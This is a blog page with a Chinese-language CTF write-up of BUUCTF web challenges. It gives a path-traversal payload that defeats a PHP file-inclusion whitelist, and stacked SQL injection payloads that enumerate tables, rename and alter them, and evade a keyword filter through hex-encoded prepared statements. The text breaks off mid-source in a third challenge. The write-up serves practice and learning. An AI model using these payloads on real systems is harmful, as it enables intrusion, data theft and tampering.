<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
<meta name="generator" content="Hexo 6.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta name="description" content="[HCTF 2018]WarmUp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172 &lt;?php    highlight_file(__FILE__);    class">
<meta property="og:type" content="article">
<meta property="og:title" content="buu">
<meta property="og:url" content="http://example.com/2022/05/05/buu/index.html">
<meta property="og:site_name" content="Echo">
<meta property="og:description" content="[HCTF 2018]WarmUp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172 &lt;?php    highlight_file(__FILE__);    class">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220505223612263.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220505223743568.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220505223940533.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220505224136124.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220505224447432.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220506143959394.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220506144045568.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220506144148137.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220506144307847.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220506144507558.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220506150957107.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220506160034474.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220506160056258.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220528160111895.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220528160238269.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220528160250151.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220528160307498.png">
<meta property="og:image" content="http://example.com/2022/05/05/buu/image-20220528160325563.png">
<meta property="article:published_time" content="2022-05-05T13:43:37.000Z">
<meta property="article:modified_time" content="2022-05-28T12:45:19.192Z">
<meta property="article:author" content="CJ">
<meta property="article:tag" content="STUDY">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/05/05/buu/image-20220505223612263.png">


<link rel="canonical" href="http://example.com/2022/05/05/buu/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/05/05/buu/","path":"2022/05/05/buu/","title":"buu"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>buu | Echo</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Echo</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">1.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">2.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">3.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="nav-number">4.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">5.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-number">6.</span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CJ</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/05/buu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          buu
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-05-05 21:43:37" itemprop="dateCreated datePublished" datetime="2022-05-05T21:43:37+08:00">2022-05-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-05-28 20:45:19" itemprop="dateModified" datetime="2022-05-28T20:45:19+08:00">2022-05-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%A4%87%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">备赛</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>65k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>59 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>) </span></span><br><span class="line"><span class="function">        //传入了变量<span class="title">page</span>，也就是我们刚刚传进来的<span class="title">file</span></span></span><br><span class="line"><span class="function">            </span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        	<span class="comment">// 这里定义了白名单,包括source.php和hint.php</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">/*为了返回 true 两个条件必须满足</span></span><br><span class="line"><span class="comment">            	1 page存在 </span></span><br><span class="line"><span class="comment">            	2 page是字符串 ，</span></span><br><span class="line"><span class="comment">            	这里和外层的判断file 一致基本是再次判断了一遍*/</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">/*in_array(search,array,type) 函数搜索数组中是否存在指定的值，</span></span><br><span class="line"><span class="comment">			白名单过滤，需要返回了ture</span></span><br><span class="line"><span class="comment">			所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，</span></span><br><span class="line"><span class="comment">			这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看*/</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$_page</span> = mb_substr( </span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>,  <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">			<span class="comment">/*这里mb_substr 是个截断，返回0到mb_strpos之间的内容，而mb_strpos 则是查找第一次出现的位置，所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/</span>    </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//这里和上面类似 查看_page 是否在白名单中</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);  <span class="comment">// 这里发现对_page进行了一次decode解码，</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(			<span class="comment">//获取两个？？之间的内容</span></span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为&#x27;?&#x27;，仍可通过第四个if语句校验。（&#x27;?&#x27;两次编码值为&#x27;%253f&#x27;），构造url：</span></span><br><span class="line">            <span class="comment">// 这里是我们要绕过的点，从这里往上看 尝试构造</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//白名单</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">/*必须满足if条件，才能包含file，这里也可以猜到可能考的是文件包含： </span></span><br><span class="line"><span class="comment">		1 REQUEST[&#x27;file&#x27;]不为空 </span></span><br><span class="line"><span class="comment">		2 REQUEST[&#x27;file&#x27;]是字符串</span></span><br><span class="line"><span class="comment">		3 checkFile($_REQUEST[&#x27;file&#x27;]) 为ture，回到checkFile 函数分析如何返回true*/</span>    </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>mb_strpos查找目标首次出现的位置，从0开始</p>
<p>mb_substr返回字符串，特别注意的是：mb_strpos获取的数字，在mb_substr不是从0开始，而是代表返回的长度</p>
<p><code>$page . &#39;?&#39;</code><br> 在PhP中，str1+.+str2即可将两个变量直接连接起来。</p>
<p>漏洞是include函数，利用文件包含漏洞，也就是需要include ffffllllaaaagggg文件，而且需要使用…/来绕过</p>
<p>我们知道如果直接放入source.php?ffffllllaaaaggg会通过checkFile的验证返回true，但是毫无疑问这种错误的文件名是无法被include正确读取的。<br>这个时候我们就要用到一个关键符号：/<br>例如：include ‘wrongname/flag.txt’<br>wrongname无法被正确读取，这个时候/后面的flag.txt就会被include函数读取并解析。</p>
<p>hint.php：可以得到提示，flag 在 <code>ffffllllaaaagggg</code> 里，但此时我们不知道flag的具体目录层次，因此构造时候需要通过</p>
<p>/index.php?file=source.php/../../ffffllllaaaagggg</p>
<p>依次通过…/…/构造尝试，去查看到底是几层的根目录。</p>
<p>尝试后，成功构造出payload如下：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">index.php?<span class="keyword">file</span>=<span class="keyword">source</span>.php?..<span class="regexp">/../</span>..<span class="regexp">/../</span>../ffffllllaaaagggg</span><br><span class="line">或者<span class="keyword">file</span>=<span class="keyword">source</span>.php?<span class="regexp">/../</span>..<span class="regexp">/../</span>../ffffllllaaaagggg(根据文件名ffff猜是<span class="number">4</span>层根目录)</span><br><span class="line">    </span><br><span class="line">payload执行流程：此时<span class="keyword">file</span>=<span class="keyword">source</span>.php?..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br><span class="line">第<span class="number">1</span>个<span class="keyword">if</span>返回<span class="keyword">false</span></span><br><span class="line">第<span class="number">2</span>个<span class="keyword">if</span>返回<span class="keyword">false</span></span><br><span class="line">$_page=<span class="keyword">source</span>.php 截取从<span class="number">0</span>到第一个？，刚好是<span class="keyword">source</span>.php</span><br><span class="line">第<span class="number">3</span>个<span class="keyword">if</span>返回<span class="keyword">true</span>，退出checkFile函数，此时核心代码中已满足<span class="keyword">if</span>(<span class="keyword">true</span>&amp;&amp;<span class="keyword">true</span>&amp;&amp;<span class="keyword">true</span>)，即执行<span class="keyword">include</span>函数</span><br><span class="line">最后<span class="keyword">include</span>(<span class="keyword">source</span>.php?..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>测试<code> 1&#39; or 1=1 #</code> ,初步判定存在SQL注入</p>
<p><code>1&#39; order by 1 #</code> ；字段数为2</p>
<p><code>1&#39; union select 1,2#</code>：<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
<p>接着尝试union注入,回显了过滤的关键字</p>
<p>堆叠注入：</p>
<p>①<code>0&#39;;show databases;#</code></p>
<p><img src="/2022/05/05/buu/image-20220505223612263.png" alt="image-20220505223612263"></p>
<p>然后用 show tables 尝试爆表。</p>
<p><code>0&#39;; show tables; #</code></p>
<p><img src="/2022/05/05/buu/image-20220505223743568.png" alt="image-20220505223743568"></p>
<p>可以看到这里有两个表，我们先尝试爆words表的内容。</p>
<p><code>0&#39;; show columns from words; #</code></p>
<p><img src="/2022/05/05/buu/image-20220505223940533.png" alt="image-20220505223940533"></p>
<p>然后报表 1919810931114514 的内容。</p>
<p>这里学到一个新知识点，表名为数字时，要用反引号包起来查询。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>&#x27;; show columns <span class="keyword">from</span> `<span class="number">1919810931114514</span> `; <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/buu/image-20220505224136124.png" alt="image-20220505224136124"></p>
<p>之后有三个解题思路：</p>
<p>思路一：</p>
<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
<p>2，把 1919810931114514 表的名字改为 words 。</p>
<p>3 ，给新 words 表添加新的列名 id 。</p>
<p>4，将 flag 改名为 data 。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; rename table <span class="built_in">words</span> <span class="keyword">to</span> word1; rename table `<span class="number">1919810931114514</span>` <span class="keyword">to</span> <span class="built_in">words</span>;alter table <span class="built_in">words</span> add <span class="built_in">id</span> int unsigned <span class="keyword">not</span> Null auto_increment primary key; alert table <span class="built_in">words</span> change flag data varchar(<span class="number">100</span>);<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/buu/image-20220505224447432.png" alt="image-20220505224447432"></p>
<p>思路二：</p>
<p>因为select被过滤了，所以先将</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">` 1919810931114514`</span> </span><br></pre></td></tr></table></figure>

<p>进行16进制编码，再通过构造payload得</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure>

<p>进而得到flag</p>
<ul>
<li>prepare…from…是预处理语句，会进行编码转换。</li>
<li>execute用来执行由SQLPrepare创建的SQL语句。</li>
<li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</li>
</ul>
<p><strong>思路三：</strong></p>
<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler <span class="string">`1919810931114514`</span> open as <span class="string">`a`</span>; handler <span class="string">`a`</span> read next;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$post</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$get</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$MysqlLink</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    <span class="variable">$MysqlLink</span> = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="variable">$datauser</span>,<span class="variable">$datapass</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$MysqlLink</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Mysql Connect Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$selectDB</span> = mysqli_select_db(<span class="variable">$MysqlLink</span>,<span class="variable">$dataName</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$selectDB</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Choose Database Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$v</span>)&amp;&amp;is_string(<span class="variable">$v</span>))&#123;</span><br><span class="line">            <span class="variable">$post</span>[<span class="variable">$k</span>] = trim(addslashes(<span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span 